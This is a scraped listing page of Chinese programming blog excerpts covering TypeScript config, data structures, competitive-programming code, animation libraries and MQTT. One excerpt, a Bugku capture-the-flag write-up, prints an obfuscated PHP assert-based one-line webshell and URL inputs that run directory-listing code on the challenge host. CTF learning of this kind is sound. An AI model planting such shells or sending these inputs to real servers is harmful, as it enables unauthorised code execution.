		{ "compilerOptions": { "target": "es5",//编译后的目标 "lib": [ "dom", //dom运行环境 "dom.iterable",//迭代器运行环境 "esnext"//es6转化成es5的环境 ], "downlevelIteration": true, "allowJs": true, //是否允许在ts文件中引入js "skipLibCheck": true,//是否跳过声明文件的检查 "esModuleInterop": true, //可以使用es6的方式导入node.js的方法 "allowSyntheticDefaultImports": true, "strict": true,//所有的语法都会进行严格的检查 "forceConsistentCasingInFileNames": true,//文件名是否区分大小写 "module": "esnext",//模块化标准 "moduleResolution": "node",//按照node的规则去找文件 "resolveJsonModule": true,//是否允许把json文件当做模块进行解析 "isolatedModules": true,//每个文件需要是一个模块 "noEmit": true, //不需要生成文件 "jsx": "react" }, "include": [ "src" //处理src目录下的文件 ] } 转载于:https://www.cnblogs.com/CoderZX/p/11620100.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95c2d68639326028bce2ce564ae8dbd7/" rel="bookmark">
			链表封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 链表 function LinkedList () { function Node(value) { this.next = null this.value = value } this.head = null this.length = 0 //在链表尾部追加元素 LinkedList.prototype.add = function (value) { if(!value) { return false } var newElement = new Node(value) if(!this.head) { this.head = newElement } else { var current = this.head while(current.next) { current = current.next } current.next = newElement } this.length ++ return true } //把链表元素 拼接成字符串 LinkedList.prototype.toString = function () { if(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95c2d68639326028bce2ce564ae8dbd7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7abf1953e3b6d7507dc2baaa8122097/" rel="bookmark">
			CTF之Bugku 过狗的一句话
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理：
利用assert()函数的漏洞----如果参数中返回的是false，报错但继续执行
&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 上面是题目提示
explode()会把字符串打散成对应得数组，也就是$poc_2=assert
所以我们在url上提交s参数
http://123.206.87.240:8010/?s=print_r(scandir(’./’))
作用是扫描当前目录下的所有文件
还可以是
http://123.206.87.240:8010/?s=print_r(scandir(’. . /’))(没有空格)
作用是扫描上级目录的文件
一般是用第一个提交后页面就会跳转
比较骚的是我在做的时候并没有
不过学到东西就行了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bc71683e10df859529a000557eb2d71/" rel="bookmark">
			P2296-寻找道路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 #include &lt;bits/stdc++.h&gt; 2 #define _for(i,a,b) for(int i = (a);i &lt; b;i ++) 3 #define _rep(i,a,b) for(int i = (a);i &gt; b;i --) 4 #define INF 0x3f3f3f3f 5 #define MOD 1000000007 6 #define maxn 200003 7 typedef long long ll; 8 9 using namespace std; 10 typedef pair&lt;int,int&gt; P;//first 是最短距离，second 是顶点编号 11 inline ll read() 12 { 13 ll ans = 0; 14 char ch = getchar(), last = ' '; 15 while(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bc71683e10df859529a000557eb2d71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/648848aeece857398af5845e12155e9a/" rel="bookmark">
			P1314-聪明的质检员
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 #include &lt;bits/stdc++.h&gt; 2 using namespace std; 3 #define _for(i,a,b) for(int i = (a);i &lt; b;i ++) 4 #define _rep(i,a,b) for(int i = (a);i &gt; b;i --) 5 #define INF 0x3f3f3f3f3f3f3f3f 6 #define pb push_back 7 #define maxn 2005390 8 typedef long long ll; 9 10 inline ll read() 11 { 12 ll ans = 0; 13 char ch = getchar(), last = ' '; 14 while(!isdigit(ch)) last = ch, ch = getchar(); 15 while(isdigit(ch)) ans = (ans &lt;&lt; 1) + (ans &lt;&lt; 3) + ch - '0', ch = getchar(); 16 if(last == '-') ans = -ans; 17 return ans; 18 } 19 inline void write(ll x) 20 { 21 if(x &lt; 0) x = -x, putchar('-'); 22 if(x &gt;= 10) write(x / 10); 23 putchar(x % 10 + '0'); 24 } 25 ll n,m,S; 26 ll w[maxn],v[maxn]; 27 ll L[maxn],R[maxn]; 28 ll pren[maxn],preV[maxn]; 29 ll rnt = INF; 30 //ll MIN = INF,MAX = 0; 31 bool C(ll d) 32 { 33 ll ans = 0; 34 _for(i,1,n+1) 35 if(w[i]&gt;=d) 36 pren[i] = pren[i-1]+1,preV[i] = preV[i-1]+v[i]; 37 else 38 pren[i] = pren[i-1],preV[i] = preV[i-1]; 39 40 _for(i,1,m+1) 41 ans += (pren[R[i]]-pren[L[i]-1])*(preV[R[i]]-preV[L[i]-1]); 42 rnt = min(rnt,llabs(ans-S)); 43 if(ans &gt; S) 44 return true; 45 return false; 46 } 47 ll solve() 48 { 49 ll lb = 0,ub = INF; 50 while(lb &lt; ub) 51 { 52 ll mid = lb+(ub-lb)/2; 53 memset(pren,0,sizeof(pren)); 54 memset(preV,0,sizeof(preV)); 55 if(C(mid)) lb = mid+1; 56 else ub = mid; 57 } 58 return rnt; 59 } 60 int main() 61 { 62 // freopen("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/648848aeece857398af5845e12155e9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38856fe1b7d55d317d2b4eb111ca1dcd/" rel="bookmark">
			sparksql报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		执行时报错：
org.apache.spark.sql.AnalysisException: Unable to generate an encoder for inner class `cn.itcast.spark.sql.Intro$Person` without access to the scope that this class was defined in.
Try moving this class out of its parent class.;
解决方法：将case class Person(name:String,age:Int)这个样例类移动到父类的外面，就是移到最外面，不要让其包含任何的类中。
转载于:https://www.cnblogs.com/mediocreWorld/p/11614361.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a44f5ae405efedbfc75488032e56c362/" rel="bookmark">
			Python_collections模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		待续
转载于:https://www.cnblogs.com/xiaokuangnvhai/p/11613433.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/132f0569ce0065fe81c82df6b8aeeed6/" rel="bookmark">
			移动端动画——requestAnimationFrame
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		window.requestAnimationFrame() 告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行
注意：若你想在浏览器下次重绘之前继续更新下一帧动画，那么回调函数自身必须再次调用window.requestAnimationFrame()
当你准备更新动画时你应该调用此方法。这将使浏览器在下一次重绘之前调用你传入给该方法的动画函数(即你的回调函数)。回调函数执行次数通常是每秒60次，但在大多数遵循W3C建议的浏览器中，回调函数执行次数通常与浏览器屏幕刷新次数相匹配。为了提高性能和电池寿命，因此在大多数浏览器里，当requestAnimationFrame() 运行在后台标签页或者隐藏的&lt;iframe&gt; 里时，requestAnimationFrame() 会被暂停调用以提升性能和电池寿命。
回调函数会被传入DOMHighResTimeStamp参数，DOMHighResTimeStamp指示当前被 requestAnimationFrame() 排序的回调函数被触发的时间。在同一个帧中的多个回调函数，它们每一个都会接受到一个相同的时间戳，即使在计算上一个回调函数的工作负载期间已经消耗了一些时间。该时间戳是一个十进制数，单位毫秒，最小精度为1ms(1000μs)。
语法：window.requestAnimationFrame(callback);
参数：callback下一次重绘之前更新动画帧所调用的函数(即上面所说的回调函数)。该回调函数会被传入DOMHighResTimeStamp参数，该参数与performance.now()的返回值相同，它表示requestAnimationFrame() 开始去执行回调函数的时刻。
返回值：一个 long 整数，请求 ID ，是回调列表中唯一的标识。是个非零值，没别的意义。你可以传这个值给 window.cancelAnimationFrame() 以取消回调函数。
示例一：
var start = null; var element = document.getElementById('SomeElementYouWantToAnimate'); element.style.position = 'absolute'; function step(timestamp) { if (!start) start = timestamp; var progress = timestamp - start; element.style.left = Math.min(progress / 10, 200) + 'px'; if (progress &lt; 2000) { window.requestAnimationFrame(step); } } window.requestAnimationFrame(step); 示例二：
&lt;!DOCTYPE html&gt; &lt;html lang="zh-CN"&gt; &lt;head&gt; &lt;meta charset="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/132f0569ce0065fe81c82df6b8aeeed6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68d37acb99471fad9c1f9aa669fb5bc3/" rel="bookmark">
			python练习题--2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、判断字符list中是否有重复
思路：通过集合去重，然后对比list长度，重复返回False,不重复返回True
#检查是否有重复元素 def check_repeat(list): return len(list)==len(set(list)) 2、两个字符串每个字符出现次数均相等，顺序可以不同
counter方法可以统计字符出现次数
#检测两个字符串是否互为变位词（即互相颠倒字符顺序） from collections import Counter def counter_str(first,second): return Counter(first)==Counter(second) 3、以字节为单位返回字符串长度
思路：字符串编码格式改为UTF-8，然后统计长度
#以字节为单位返回字符串长度 def byte_size(str): return len(str.encode('utf-8')) #一个汉字占3个字节 4、重复打印字符串
思路：乘以n，实现多次的效果
#重复打印字符串N次 n=7 str='zhao' print(str*n) 5、字符串中每个词首字母大写
#首字母大写，字符串每个词进行首字母大写 s='count your awesome' print(s.title()) #字符串内每个词进行首字母大写 6、删除list中错误的数据
bool函数，错误的数就是FALSE,0,none,filter相当于迭代器，把list中的每个值传给bool方法
#以下方法使用fliter()删除列表中的错误值（如：false,none,0和""） def compact(lst): return list(filter(bool,lst)) print(compact([0,1,False,2,3,None,4,5])) 7、间隔数--转换二维数组
思路：通过解包函数,把array数组每个二维数组解包，重新组合
#间隔数--转换一个二维数组 array=[['a','b'],['c','d'],['e','f']] transposed=list(zip(*array)) print(transposed) #[('a', 'c', 'e'), ('b', 'd', 'f')] 8、字符串列表转换为单个字符串，列表中的每个元素用逗号分隔
#字符串列表转换为单个字符串，列表中的每个元素用逗号分隔 hobbies=['your','jeans','swimming'] print(','.join(hobbies)) 9、计算元音字母数
思路：通过正则匹配，然后统计得出数组的长度就是元音字母数
import re def word_num(str): return len(re.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68d37acb99471fad9c1f9aa669fb5bc3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1518de9e2342b36047467d016d1ab771/" rel="bookmark">
			linux文件系统--DIR-dirent-stat-d_type
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DIR结构体
struct __dirstream { void *__fd; char *__data; int __entry_data; char *__ptr; int __entry_ptr; size_t __allocation; size_t __size; __libc_lock_define (, __lock) }; typedef struct __dirstream DIR; dirent结构体
struct dirent { long d_ino; /* inode number 索引节点号 */ off_t d_off; /* offset to this dirent 在目录文件中的偏移 */ unsigned short d_reclen; /* length of this d_name 文件名长 */ unsigned char d_type; /* the type of d_name 文件类型 */ char d_name [NAME_MAX+1]; /* file name (null-terminated) 文件名，最长255字符 */ } stat获取结构体
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1518de9e2342b36047467d016d1ab771/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8816471e24be122ac472c7bf9d7da618/" rel="bookmark">
			XLSX.js 导出Excel demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitHub：https://github.com/SheetJS/js-xlsx
一个js操作Excel的工具，如下代码，很方便的就将json数据导出为Excel文件。
使用示例：
//json 数据 var data = [{ "a": 1, "x": 2, "b": 3, "y": 4, "success":true }, { "a": 1, "x": 2, "b": 3, "y": 4, "success":false } ]; //数据表格 var table=[]; table.push({ A:"列A", B:"列B", C:"列C", D:"列D", E:"列E" }); data.forEach(function (item) { var row={ A:item.b, B:item.y, C:item.a, D:item.x, E:(item.success?'成功':'失败') }; table.push(row); }); //创建book var wb = XLSX.utils.book_new(); //json转sheet var ws = XLSX.utils.json_to_sheet(table, {header:["A","B","C","D","E"], skipHeader:true}); //设置列宽 ws['!cols']= [ {width: 15}, {width: 15}, {width: 15}, {width: 15}, {width: 10} ]; var timestamp = (new Date()).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8816471e24be122ac472c7bf9d7da618/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99ba9ba3faf51d63a7bb1f46a47c9ba0/" rel="bookmark">
			Spring实战——ServletContextResource
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 视图
&lt;%@ page contentType="text/html; charset=GBK" language="java" errorPage="" %&gt; &lt;%@ page import="org.springframework.web.context.support.ServletContextResource"%&gt; &lt;%@ page import="org.dom4j.*,org.dom4j.io.*,java.util.*"%&gt; &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt; &lt;head&gt; &lt;title&gt;测试ServletContextResource&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h3&gt;测试ServletContextResource&lt;/h3&gt; &lt;% // 从Web Context下的WEB-INF路径下读取book.xml资源 ServletContextResource src = new ServletContextResource (application , "WEB-INF/book.xml"); // 获取该资源的简单信息 System.out.println(src.getFilename()); System.out.println(src.getDescription()); // 创建基于SAX的dom4j解析器 SAXReader reader = new SAXReader(); Document doc = reader.read(src.getFile()); // 获取根元素 Element el = doc.getRootElement(); List l = el.elements(); // 遍历根元素的全部子元素 for (Iterator it = l.iterator();it.hasNext() ; ) { // 每个节点都是&lt;书&gt;节点 Element book = (Element)it.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99ba9ba3faf51d63a7bb1f46a47c9ba0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b5cd9cb1c64f48e1821770e3a751224/" rel="bookmark">
			Animate.css在vue中的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Animate.ss的动画效果超可爱的，用起来也方便，最近用了，记录一下
? vue中animate.css的安装和使用 安装：
npm install animate.css --save //或者 yarn add animate.css 使用
? 在入口文件中引入
import animate from 'animate.css' Vue.use(animate) ? 选择你要的样式
打开官网Animate.css
? 具体使用
在你需要动画样式的地方把样式名称写上就行
注意！一定要写这个animated
? animate.css在vue中的入场和离场动画
enter-active-class和leave-active-class在vue官网中有介绍
点击，vue官网走一波
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;动画-未使用动画&lt;/title&gt; &lt;link rel="stylesheet" href="css/animate.css" /&gt; &lt;script src="https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.js"&gt;&lt;/script&gt; &lt;style&gt; .demo{ width: 150px; height: 150px; background-color: pink; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;!--点击按钮让h3显示，再点击，让h3显示--&gt;	&lt;div id="example"&gt; &lt;input type="button" value="btn" @click="flag=!flag"/&gt;	&lt;!--使用transtion元素把需要被动画控制的元素包裹起来--&gt; &lt;!--transition元素是官方提供的--&gt; &lt;!--使用animate.css库--&gt; &lt;transition enter-active-class="animated bounceIn"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b5cd9cb1c64f48e1821770e3a751224/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cface135edd938bcb90b8dcc52e17f4/" rel="bookmark">
			个人日常训练计划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日期名称2019-09-26 2018-2019 ACM-ICPC Southeastern
European Regional Programming Contest (SEERC 2018)
2019-09-27 浅学模拟退火2019-09-28 Codeforces 几何 1700+ pt1（5/26）+ 2019CCPC秦皇岛赛区（重现赛）- 感谢东秦&amp;复旦2019-09-29 Codeforces 几何 1700+ pt1（11/26）+ Codeforces Round #589 (Div. 2) 2019-09-30 Codeforces 几何 1700+ pt1（16/26）+ 昨日CF补题题解 2019-10-01 Codeforces 几何 1700+ pt1 （21/26）+ 2019牛客国庆集训派对day1 2019-10-02 Codeforces 几何 1700+ pt1 （26 /26） + 2019牛客国庆集训派对day1补题题解
转载于:https://www.cnblogs.com/Carered/p/11602849.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f35a61dc77b6cc1463ab5cf96b48e2c/" rel="bookmark">
			1.linux系统基础笔记（互斥量、信号量）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作系统是很多人每天必须打交道的东西，因为在你打开电脑的一刹那，随着bios自检结束，你的windows系统已经开始运行了。如果问大家操作系统是什么？可能有的人会说操作系统就是windows，就是那些可以放大、缩小、移动的窗口。对曾经是计算机专业的朋友来说，这个答案还要稍微复杂一些，操作系统可能还有linux、unix、ios、sun solaris、aix等。如果再细化一点，对嵌入式工具比较解的朋友还会有新的补充，因为在他们看来，vxworks、eCos、ucos也都是操作系统，虽然它们好多系统连界面都没有。
既然操作系统称之为一个系统，那么它必然是由好多的部件组成的。有过linux嵌入式开发经验的朋友都知道，要想使一个linux在arm芯片上真正跑起来，它必须有三个部分组成，即boot + 内核 + 文件系统。而真正内核的东西其实很少，也就是cpu初始化、线程调度、内存分配、文件系统、网络协议栈、驱动这些部分组成。那么是不是所有的芯片都需要跑操作系统呢？我们可以举个例子。
现在有一个简单的温度测量电路，它由三部分组成：1、单片机；2、温度传感器模块；3、无线发射模块。我们设计这么一个温度测量电路其实就是一个目的，那就是为了实时获取当前的温度信息。那么，这么一个简单的电路应该怎么设计程序呢？其实很简单。
void sleep(int value) { int outer; int inner; for(; outer &lt; value; outer++) { for(inner = 0; inner &lt; 1000; inner++) ; } } void main() { while(1) { /* read temperature from port*/ sleep(1000); /* send temperature to wireless module */ sleep(1000); } } 如果我们需要cpu干的事情很少，甚至极端一点说只有一件事情，那么根本没有设计操作系统的必要。我们设计出操作系统，主要是想在单位时间内完成几件事情。打个比方来说，你完全可以在工作的时候一遍写文档、一遍收发电子邮件，偶尔还能开个小差休息一会。 所以操作系统就是为了共享资源而存在的。
认识操作系统的用途不难，关键是如何把操作系统用代码写出来。也许有人会跟你说，免费的代码一大堆，Linux就不错，你下载下来直接读就好了。但是我告诉你，最新的Linux内核版本已经轻松的越过了3.0，整个代码的长度远在千万行之上，你可能从哪看起都不知道。可能此时又有人不同意了，看不懂高版本的linux，可以看看linux低版本的代码，0.11版本的代码就不错，因为赵炯就是怎么推荐的。我要说的是，0.11的代码固然好，但是怎么编译版本、怎么修改代码、怎么构造文件系统、怎么跑起来是我们绕不过的一道难题。对于很多朋友来说，阅读linux代码尚且困难，更不要说后面还需要完成的一大摊子烂事了。
说了这么多，我们需要的的内核代码是什么样的？其实在我看来，很简单。它只要满足下面两个条件就可以了，
（1）像用户软件一样可以运行；
（2）像用户软件一样可以单步调试。 要解决这些问题，对linux系统来说上不难解决。要解决os的运行和调试问题，关键就在于如何仿真中断和实现os的任务切换。至于任务的开启、运行和挂起，内存分配，互斥量，信号量，文件系统，tcp/ip协议栈，GUI操作，这些其实都是可以在linux上进行仿真和操作的，朋友们可以尽请放心。这部分的内容，我们会在以后的博客中陆续展开。
为了能够更好地阅读后面发表的博文，我建议你巩固一下下面这些知识，这样会对你的理解有很大的裨益。
（1）cpu 结构，了解中断流程就行；
（2）linux 汇编语言；
（3）函数堆栈格式和内容；
（4）互斥量、信号量的使用方法；
（5）调度的基本策略；
（6）内存分配的基本方法；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f35a61dc77b6cc1463ab5cf96b48e2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dfa69c22110c85c97162f322a78ffa5/" rel="bookmark">
			【物联网】MQTT协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		维基 和 官网 的 文档资料比较完整，引用一张网络上的关于解释MQTT协议工作原理的图片：
简单的说，MQTT就是一种基于发布-订阅结构的（publish-subscribe-based messaging protocol）协议，其实现基于TCP/IP协议，也可以使用UDP等协议实现。
消息的生产者产生新的消息的过程可以称为“发布”，消息的消费者想要获得消息的过程称为“订阅”，发布消息和订阅消息都伴随着一个消息的种类，也就是消息的主题Topic，发布消息和订阅消息都需要指定消息的Topic（好比一群人聚会，人们按照自己的兴趣爱好组成一支支小团体，而我对打篮球感兴趣，所以我参与到了讨论篮球的团体中去了，这样我就能收到这个篮球团体中的所有信息）。一个生产者可以生产多种主题的消息，同样的，一个消费者可以对多种主题的消息感兴趣。在MQTT协议中，消息的生产者和消费者是处于平等的关系，一个生产者可以同时是一个消费者（卖肉的也得买素菜吃），但是为了“规范市场”，不能要生产者和消费者之间乱交易，因此，他们之间进行“交易”需要一个第三方机构介入，这个机构就是“工商局”Broker，Broker的作用就是在生产者产生某主题（Topic）的消息时，将该消息转发至对该主题感兴趣的消费者。
基于上面的说法，我们可以使用MQTT协议实现终端设备和服务器（这个服务器不是Broker服务器，而是应用相关的服务器）之间的通讯。举个例子，有种共享单车叫做“小红”，每辆“小红”都使用NB-IOT网络连入到互联网，并使用MQTT协议连入到一个MQTT Broker 服务器。同时共享单车的后台管理程序（服务器）也会连接到同一个MQTT Broker 服务器。每个“小红”都可以发布一个Topic为 “/SharedBicycle/xiaohong/endpoint”的消息，然后服务器会订阅这个主题，这样“小红”的信息（是否关锁、GPS位置、电池电量、信号强度等等）都可以发送给服务器了。同时，服务器会发布一个Topic为“/SharedBicycle/xiaohong/server-xxxxxxxx”的主题（其中“xxxxxxxx”表示单车的唯一ID号，但是“小红”发布的Topic中没有包含ID，因为ID信息可以直接包含在数据包字段中，这样可以避免每辆“小红”都需要发布一个专门的Topic，因此可以减小Broker服务器的负担），每个“小红”都会订阅和自己ID对应的主题，这样服务器就可以发送控制命令给某个“小红”，实现开锁或者状态查询功能。（上诉方案只是为了解释MQTT工作的一个简单设想，很多细节没有考虑，例如传输加密，Broker性能等问题）
MQTT Control Packet帧是MQTT协议中的基本传输单元，所有连接、断开、发布、订阅等操作都是通过发送MQTT Control Packet帧实现的。MQTT Control Packet帧结构如下（摘自官方Doc）：
Figure 2.1 – Structure of an MQTT Control Packet
Fixed header, present in all MQTT Control Packets
Variable header, present in some MQTT Control Packets
Payload, present in some MQTT Control Packets
Figure 2.2 - Fixed header format
Bit
7
6
5
4
3
2
1
0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7dfa69c22110c85c97162f322a78ffa5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ab41795b1f66c349e95af81b2ef8303/" rel="bookmark">
			array.sort()方法及原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sort()方法在适当的位置对数组进行排序，并且返回数组。
对于sort()方法，W3school给的定义是
arrayObject.sort(sortby) 说明 如果调用该方法时没有使用参数，将按字母顺序对数组中的元素进行排序，说得更精确点，是按照字符编码的顺序进行排序。要实现这一点，首先应把数组的元素都转换成字符串（如有必要），以便进行比较。
如果想按照其他标准进行排序，就需要提供比较函数，该函数要比较两个值，然后返回一个用于说明这两个值的相对顺序的数字。比较函数应该具有两个参数 a 和 b，其返回值如下：
若 a 小于 b，在排序后的数组中 a 应该出现在 b 之前，则返回一个小于 0 的值。若 a 等于 b，则返回 0。若 a 大于 b，则返回一个大于 0 的值。 arrayObject.sort(sortby)：参数可选。规定排序顺序。必须是函数。
可知参数是可选的，也就是有两种情况，一是不加参数，另外一种是加函数参数，参数必须是函数。函数就是比较函数。
先看第一种不加参数的情况：
var arr=[1,3,10,4,2]; arr.sort(); alert(arr); //1,10,2,3,4 默认排序顺序是升序，在上面的例子当中，我们感觉排序的结果是：1，2，3，4，10。怎么出来10反而在前面呢？那是因为sort()排序是按照字符串的Unicode码，10的比后面的小，则他在前面，但是这个结果不是我们想要的，那怎么办？此时我们就要用到第二种情况：加函数参数。
第二种加函数参数的情况：
var arr=[1,3,10,4,2]; function compare(value1,value2) { if(value1&lt;value2){return -1;} else if(value1&gt;value2){return 1;} else {return 0} } arr.sort(compare); alert(arr) //1,2,3,4,10 按照我的理解是，在对于一个数组使用sort()方法时，会逐项的将数组中的元素传入到compare函数中作为参数，也就是说在上面 var arr=[1,3,10,4,2]使用sort()方法时，按照顺序先把1，3分别传给value1和value2，再比较1和3的大小，显然1&lt;3，那么根据判断函数返回-1；sort()方法在接受到函数返回的-1时，就做出按照升序的原理不换位置，现在虽然数组位置没有变，但是数组是刷新过一边的，sort()返回了一个新的数组，所以在第二次传入参数的时候，是传入的第二项3和第三项10（第一次换位置的话，那么第二项就是换过后的第二项）按着同样的原理进行比较返回-1；后面的步骤就一样了，在第三次比较的时候要注意，如果前面的返回值为-1，那么新数组的第一项和第二项不用再比较（升序，-1就不比较，因为-1表示大数本来就在后面 ），如上面所示：1&lt;3,3&lt;10,那么1&lt;10;如果为1，比如，2&lt;5,5&gt;1第二个返回值是1，则排完的新数是：2，1，5；所以接下来就是2和1比较，最终的1，2，5……所以上面的结果是1,2,3,4,10
接下来我用一个例子来说明这个过程：
var arr=[1,3,10,4,2,5]; function compare(value1,value2) { console.log(value1,value2,arr); if(value1&lt;value2){return -1;} else if(value1&gt;value2){return 1;} else {return 0} } arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ab41795b1f66c349e95af81b2ef8303/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6f9dab14bd9ff35bd02d54dbd4baba7/" rel="bookmark">
			GASP动画和ScrollMagic
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、GSAP基础 1.GSAP开篇 1.什么是ScrollMagic?
ScrollMagic是一个滚动视差插件
ScrollMagic本身比较简单，只包含2个类：
crollMagic.Controller 一个控制器类，用于总体的调度 ；
ScrollMagic.Scene 一个场景类，用于设计具体的变换。
需要注意的是，它本身并没有集成 animation的控制方法，动画的实现，需要引入插件 GSAP 或者是 Velocity；
什么是GSAP?
GSAP(GreenSock Animation Platform)是一个从flash时代一直发展到今天的专业动画库
GSAP优点
1、速度快。GSAP专门优化了动画性能，使之实现和CSS一样的高性能动画效果。
2、轻量与模块化。模块化与插件式的结构保持了核心引擎的轻量，TweenLite包非常小（基本上低于7kb）。GSAP提供了TweenLite, TimelineLite, TimelineMax 和 TweenMax不同功能的动画模块，你可以按需使用。
3、没有依赖。
4、灵活控制。不用受限于线性序列，可以重叠动画序列，你可以通过精确时间控制，灵活地使用最少的代码实现动画。
GSAP版本
GSAP提供4个库文件供用户使用
1.TweenLite：这是GSAP动画平台的核心部分，使用它可以用来实现大部分的动画效果，适合来实现一些元素的简单动画效果。
2.TimelineLite：一个强大的，轻量级的序列工具，它就如一个存放补间动画的容器，可以很容易的整体控制补间动画，且精确管理补间动画彼此之间的时间关系。比如动画的各种状态，Pause，reverse，restart，speed up，slow down，seek time，add labels等。它适合来实现一些复杂的动画效果。
3.TimelineMax：扩展TimelineLite，提供完全相同的功能再加上有用的（但非必需）功能，如repeat，repeatDelay，yoyo，currentLabel()等。TimelineMax的目标是成为最终的全功能工具，而不是轻量级的。
4.TweenMax：可以完成TimelineLite做的每一件事，并附加非必要的功能，如repeat，yoyo，repeatDelay(重复延迟)等。它也包括许多常见的插件，如CSSPlugin，这样您就不需自行载入多个文件。侧重于全功能的，而不是轻量级的。
建议在开发中使用 TweenMax 这个全功能的 js文件，它包括了GreenSock动画平台的所有核心的功能。
官网地址：http://www.greensock.com/
github地址（下载文件）：https://github.com/greensock/GreenSock-JS/
中文网: https://www.tweenmax.com.cn/
&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-GSAP开篇&lt;/title&gt; &lt;script src="js/TweenMax.js"&gt;&lt;/script&gt; &lt;style&gt; *{ margin: 0; padding: 0; } div{ width: 100px; height: 100px; background: red; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6f9dab14bd9ff35bd02d54dbd4baba7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d1140365bc296a5f48768af68ce8fff/" rel="bookmark">
			《程序员的修炼之道——从小工到专家》读第一章有感
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		九月份，我读了《程序员的修炼之道--从小工到专家》这本书，虽然只是读了其中小小的一章，却让我收获了许多，收益匪浅。
